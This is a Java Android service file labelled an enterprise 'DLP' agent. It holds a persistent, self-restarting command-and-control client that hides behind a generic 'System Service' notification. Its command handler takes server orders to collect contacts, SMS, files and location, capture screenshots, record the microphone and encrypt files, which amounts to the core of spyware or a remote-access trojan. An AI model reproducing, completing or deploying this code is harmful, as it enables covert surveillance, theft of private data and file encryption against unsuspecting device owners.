package com.athex.dlp.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.athex.dlp.MainActivity;
import com.athex.dlp.network.TCPClient;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ATHEX DLP Enterprise - Main Background Service
 * 
 * Core foreground service that keeps the application alive and manages
 * the TCP connection to the server. This service runs continuously in
 * the background and restarts automatically if killed.
 * 
 * Responsibilities:
 * - Maintain persistent TCP connection
 * - Keep service alive with foreground notification
 * - Handle auto-restart on service destruction
 * - Monitor battery optimization status
 * - Manage wake locks for reliable operation
 * - Auto-reconnect on network changes
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class MainService extends Service {
    
    // ============================================================
    // CONSTANTS
    // ============================================================
    
    private static final String TAG = "ATHEX_MainService";
    private static final int FOREGROUND_NOTIFICATION_ID = 1001;
    private static final String NOTIFICATION_CHANNEL_ID = "athex_dlp_service";
    private static final String NOTIFICATION_CHANNEL_NAME = "ATHEX DLP Service";
    
    // Service restart constants
    private static final long RESTART_DELAY_MS = 3000; // 3 seconds
    private static final long SERVICE_MONITOR_INTERVAL = 60000; // 1 minute
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    // Core components
    private TCPClient tcpClient;
    private NotificationManager notificationManager;
    private PowerManager.WakeLock wakeLock;
    
    // Handlers
    private Handler mainHandler;
    private Handler serviceMonitorHandler;
    
    // State
    private final AtomicBoolean isServiceRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnectionRequested = new AtomicBoolean(false);
    
    // Service monitor runnable
    private Runnable serviceMonitorRunnable;
    
    // Server configuration (will be injected during build)
    private String serverHost = "127.0.0.1";
    private int serverPort = 22533;
    
    // ============================================================
    // LIFECYCLE METHODS
    // ============================================================
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        Log.i(TAG, "========================================");
        Log.i(TAG, "MainService onCreate()");
        Log.i(TAG, "========================================");
        
        // Initialize handlers
        mainHandler = new Handler(Looper.getMainLooper());
        serviceMonitorHandler = new Handler(Looper.getMainLooper());
        
        // Initialize managers
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        
        // Create notification channel (Android 8+)
        createNotificationChannel();
        
        // Acquire wake lock
        acquireWakeLock();
        
        // Initialize TCP client
        initializeTCPClient();
        
        // Start service monitor
        startServiceMonitor();
        
        Log.i(TAG, "MainService created successfully");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand() - flags: " + flags + ", startId: " + startId);
        
        // Extract server config from intent if available
        if (intent != null && intent.hasExtra("server_host")) {
            serverHost = intent.getStringExtra("server_host");
            serverPort = intent.getIntExtra("server_port", 22533);
            Log.d(TAG, "Server config from intent: " + serverHost + ":" + serverPort);
            
            // Update TCP client with new config
            if (tcpClient != null) {
                tcpClient.updateServerConfig(serverHost, serverPort);
            }
        }
        
        // Start foreground service with notification
        startForegroundService();
        
        // Start connection if not already connected
        if (!isConnectionRequested.get() || !tcpClient.isConnected()) {
            startConnection();
        }
        
        isServiceRunning.set(true);
        
        // Return START_STICKY to restart service if killed
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // Not supporting binding
        return null;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.w(TAG, "onTaskRemoved() - Task removed, scheduling restart");
        
        // Schedule restart when app is removed from recent apps
        scheduleServiceRestart();
        
        super.onTaskRemoved(rootIntent);
    }
    
    @Override
    public void onDestroy() {
        Log.w(TAG, "========================================");
        Log.w(TAG, "MainService onDestroy()");
        Log.w(TAG, "========================================");
        
        isServiceRunning.set(false);
        
        // Stop service monitor
        stopServiceMonitor();
        
        // Disconnect TCP client
        disconnectTCPClient();
        
        // Release wake lock
        releaseWakeLock();
        
        // Schedule restart if service was killed unexpectedly
        if (isConnectionRequested.get()) {
            Log.w(TAG, "Service destroyed unexpectedly, scheduling restart");
            scheduleServiceRestart();
        }
        
        super.onDestroy();
    }
    
    // ============================================================
    // FOREGROUND SERVICE
    // ============================================================
    
    /**
     * Start foreground service with persistent notification
     */
    private void startForegroundService() {
        // Create notification intent (opens MainActivity when tapped)
        Intent notificationIntent = new Intent(this, MainActivity.class);
        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );
        
        // Build notification
        Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
        
        // Start foreground service
        startForeground(FOREGROUND_NOTIFICATION_ID, notification);
        
        Log.d(TAG, "Foreground service started with notification");
    }
    
    /**
     * Create notification channel for Android 8+
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            );
            
            channel.setDescription("ATHEX DLP background service notification");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            
            notificationManager.createNotificationChannel(channel);
            
            Log.d(TAG, "Notification channel created");
        }
    }
    
    /**
     * Update foreground notification text
     */
    public void updateNotification(String title, String content) {
        Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        
        notificationManager.notify(FOREGROUND_NOTIFICATION_ID, notification);
    }
    
    // ============================================================
    // TCP CLIENT MANAGEMENT
    // ============================================================
    
    /**
     * Initialize TCP client with connection listeners
     */
    private void initializeTCPClient() {
        Log.d(TAG, "Initializing TCP client...");
        
        tcpClient = new TCPClient(this, serverHost, serverPort);
        
        // Set connection listener
        tcpClient.setConnectionListener(new TCPClient.ConnectionListener() {
            @Override
            public void onConnected(String serverInfo) {
                Log.i(TAG, "✅ Connected to server: " + serverInfo);
                
                mainHandler.post(() -> {
                    updateNotification("System Service", "Connected");
                    
                    // Notify MainActivity if visible
                    broadcastStatus("CONNECTED", serverInfo);
                });
            }
            
            @Override
            public void onDisconnected(String reason) {
                Log.w(TAG, "❌ Disconnected: " + reason);
                
                mainHandler.post(() -> {
                    updateNotification("System Service", "Reconnecting...");
                    
                    // Notify MainActivity if visible
                    broadcastStatus("DISCONNECTED", reason);
                });
            }
            
            @Override
            public void onConnectionFailed(String error, int attempt) {
                Log.e(TAG, "❌ Connection failed (Attempt " + attempt + "): " + error);
                
                mainHandler.post(() -> {
                    updateNotification("System Service", "Connecting... (" + attempt + ")");
                    
                    // Notify MainActivity if visible
                    broadcastStatus("CONNECTION_FAILED", error);
                });
            }
            
            @Override
            public void onReconnecting(int attempt, int delaySeconds) {
                Log.w(TAG, "🔄 Reconnecting in " + delaySeconds + "s (Attempt " + attempt + ")");
                
                mainHandler.post(() -> {
                    updateNotification("System Service", 
                        "Reconnecting in " + delaySeconds + "s...");
                    
                    // Notify MainActivity if visible
                    broadcastStatus("RECONNECTING", String.valueOf(attempt));
                });
            }
        });
        
        // Set message listener
        tcpClient.setMessageListener(new TCPClient.MessageListener() {
            @Override
            public void onMessageReceived(String message) {
                // Handle incoming messages
                Log.d(TAG, "Message received: " + 
                    message.substring(0, Math.min(100, message.length())));
                
                // Process message (delegated to command handlers)
                processServerMessage(message);
            }
            
            @Override
            public void onCommandReceived(String command, String[] args) {
                Log.d(TAG, "Command received: " + command);
                
                // Process command
                processServerCommand(command, args);
            }
            
            @Override
            public void onMessageSent(String message) {
                // Message sent successfully
                Log.v(TAG, "Message sent: " + 
                    message.substring(0, Math.min(50, message.length())));
            }
            
            @Override
            public void onMessageFailed(String message, String error) {
                Log.e(TAG, "Message failed: " + error);
            }
        });
        
        Log.d(TAG, "TCP client initialized");
    }
    
    /**
     * Start connection to server
     */
    private void startConnection() {
        if (tcpClient == null) {
            Log.e(TAG, "TCP client not initialized");
            return;
        }
        
        if (tcpClient.isConnected()) {
            Log.d(TAG, "Already connected");
            return;
        }
        
        Log.i(TAG, "Starting connection to " + serverHost + ":" + serverPort);
        isConnectionRequested.set(true);
        tcpClient.connect();
    }
    
    /**
     * Disconnect TCP client
     */
    private void disconnectTCPClient() {
        if (tcpClient != null) {
            tcpClient.disconnect();
            isConnectionRequested.set(false);
        }
    }
    
    /**
     * Process incoming message from server
     */
    private void processServerMessage(String message) {
        if (message == null || message.isEmpty()) {
            return;
        }
        
        // Parse message and handle accordingly
        if (message.startsWith("COMMAND:")) {
            String command = message.substring(8);
            handleServerCommand(command);
        } else if (message.startsWith("PING")) {
            // Respond to ping
            tcpClient.sendMessage("PONG|" + System.currentTimeMillis());
        } else if (message.startsWith("AUTH_OK")) {
            Log.i(TAG, "Authentication successful");
            broadcastStatus("AUTHENTICATED", "OK");
        } else if (message.startsWith("AUTH_FAILED")) {
            Log.e(TAG, "Authentication failed");
            broadcastStatus("AUTH_FAILED", "Invalid credentials");
        }
    }
    
    /**
     * Process server command
     */
    private void processServerCommand(String command, String[] args) {
        switch (command) {
            case "GET_CONTACTS":
                // Trigger contact collection
                broadcastCommand("COLLECT_CONTACTS", null);
                break;
                
            case "GET_SMS":
                // Trigger SMS collection
                broadcastCommand("COLLECT_SMS", null);
                break;
                
            case "GET_FILES":
                // Trigger file listing
                String path = args.length > 0 ? args[0] : "/sdcard/";
                broadcastCommand("COLLECT_FILES", path);
                break;
                
            case "GET_LOCATION":
                // Trigger location collection
                broadcastCommand("COLLECT_LOCATION", null);
                break;
                
            case "SCREENSHOT":
                // Trigger screenshot
                broadcastCommand("CAPTURE_SCREENSHOT", null);
                break;
                
            case "RECORD_MIC":
                // Trigger microphone recording
                String duration = args.length > 0 ? args[0] : "30";
                broadcastCommand("RECORD_MIC", duration);
                break;
                
            case "ENCRYPT_FILE":
                // Trigger file encryption
                String filePath = args.length > 0 ? args[0] : "";
                broadcastCommand("ENCRYPT_FILE", filePath);
                break;
                
            default:
                Log.w(TAG, "Unknown command: " + command);
                break;
        }
    }
    
    /**
     * Handle server command (legacy format)
     */
    private void handleServerCommand(String command) {
        // Parse and delegate to processServerCommand
        if (command.contains("|")) {
            String[] parts = command.split("\\|", 2);
            String cmd = parts[0];
            String[] cmdArgs = parts.length > 1 ? parts[1].split("\\|") : new String[0];
            processServerCommand(cmd, cmdArgs);
        } else {
            processServerCommand(command, new String[0]);
        }
    }
    
    // ============================================================
    // WAKE LOCK MANAGEMENT
    // ============================================================
    
    /**
     * Acquire partial wake lock to keep CPU running
     */
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "ATHEX_DLP::WakeLock"
                );
                
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(30 * 60 * 1000L); // 30 minutes timeout
                
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire WakeLock: " + e.getMessage());
        }
    }
    
    /**
     * Release wake lock
     */
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to release WakeLock: " + e.getMessage());
        }
    }
    
    // ============================================================
    // SERVICE MONITOR
    // ============================================================
    
    /**
     * Start service monitor to ensure service stays alive
     */
    private void startServiceMonitor() {
        serviceMonitorRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isServiceRunning.get()) {
                    Log.w(TAG, "Service monitor detected service stopped, restarting...");
                    scheduleServiceRestart();
                    return;
                }
                
                // Check TCP connection health
                if (isConnectionRequested.get() && tcpClient != null && !tcpClient.isConnected()) {
                    Log.w(TAG, "Service monitor detected connection lost, reconnecting...");
                    tcpClient.connect();
                }
                
                // Schedule next check
                serviceMonitorHandler.postDelayed(this, SERVICE_MONITOR_INTERVAL);
            }
        };
        
        serviceMonitorHandler.postDelayed(serviceMonitorRunnable, SERVICE_MONITOR_INTERVAL);
        Log.d(TAG, "Service monitor started");
    }
    
    /**
     * Stop service monitor
     */
    private void stopServiceMonitor() {
        if (serviceMonitorRunnable != null) {
            serviceMonitorHandler.removeCallbacks(serviceMonitorRunnable);
        }
        Log.d(TAG, "Service monitor stopped");
    }
    
    // ============================================================
    // RESTART MECHANISM
    // ============================================================
    
    /**
     * Schedule service restart using AlarmManager or WorkManager
     */
    private void scheduleServiceRestart() {
        Log.w(TAG, "Scheduling service restart in " + (RESTART_DELAY_MS / 1000) + " seconds");
        
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent restartIntent = new Intent(MainService.this, MainService.class);
                restartIntent.putExtra("server_host", serverHost);
                restartIntent.putExtra("server_port", serverPort);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(restartIntent);
                } else {
                    startService(restartIntent);
                }
                
                Log.i(TAG, "Service restarted");
            }
        }, RESTART_DELAY_MS);
    }
    
    // ============================================================
    // BROADCAST HELPERS
    // ============================================================
    
    /**
     * Broadcast status to MainActivity or other components
     */
    private void broadcastStatus(String status, String message) {
        Intent broadcastIntent = new Intent("com.athex.dlp.SERVICE_STATUS");
        broadcastIntent.putExtra("status", status);
        broadcastIntent.putExtra("message", message);
        broadcastIntent.putExtra("timestamp", System.currentTimeMillis());
        
        sendBroadcast(broadcastIntent);
        Log.d(TAG, "Broadcast sent: " + status + " - " + message);
    }
    
    /**
     * Broadcast command to collectors
     */
    private void broadcastCommand(String command, String data) {
        Intent broadcastIntent = new Intent("com.athex.dlp.COMMAND");
        broadcastIntent.putExtra("command", command);
        
        if (data != null) {
            broadcastIntent.putExtra("data", data);
        }
        
        broadcastIntent.putExtra("timestamp", System.currentTimeMillis());
        
        sendBroadcast(broadcastIntent);
        Log.d(TAG, "Command broadcast: " + command);
    }
    
    // ============================================================
    // PUBLIC API
    // ============================================================
    
    /**
     * Get TCP client instance
     */
    public TCPClient getTCPClient() {
        return tcpClient;
    }
    
    /**
     * Check if connected to server
     */
    public boolean isConnectedToServer() {
        return tcpClient != null && tcpClient.isConnected();
    }
    
    /**
     * Send message to server
     */
    public boolean sendToServer(String message) {
        if (tcpClient != null && tcpClient.isConnected()) {
            return tcpClient.sendMessage(message);
        }
        return false;
    }
    
    /**
     * Update server configuration
     */
    public void updateServerConfig(String host, int port) {
        this.serverHost = host;
        this.serverPort = port;
        
        if (tcpClient != null) {
            tcpClient.updateServerConfig(host, port);
        }
        
        // Reconnect with new config
        disconnectTCPClient();
        
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                startConnection();
            }
        }, 1000);
        
        Log.d(TAG, "Server config updated, reconnecting...");
    }
    
    /**
     * Get service running state
     */
    public boolean isServiceRunning() {
        return isServiceRunning.get();
    }
    
    /**
     * Get connection statistics
     */
    public String getConnectionStats() {
        if (tcpClient == null) {
            return "Not initialized";
        }
        
        StringBuilder stats = new StringBuilder();
        stats.append("Connected: ").append(tcpClient.isConnected()).append("\n");
        stats.append("Server: ").append(tcpClient.getServerHost())
             .append(":").append(tcpClient.getServerPort()).append("\n");
        stats.append("Bytes Sent: ").append(tcpClient.getBytesSent()).append("\n");
        stats.append("Bytes Received: ").append(tcpClient.getBytesReceived()).append("\n");
        stats.append("Queue Size: ").append(tcpClient.getQueueSize()).append("\n");
        stats.append("Reconnect Attempts: ").append(tcpClient.getReconnectAttempts());
        
        return stats.toString();
    }
}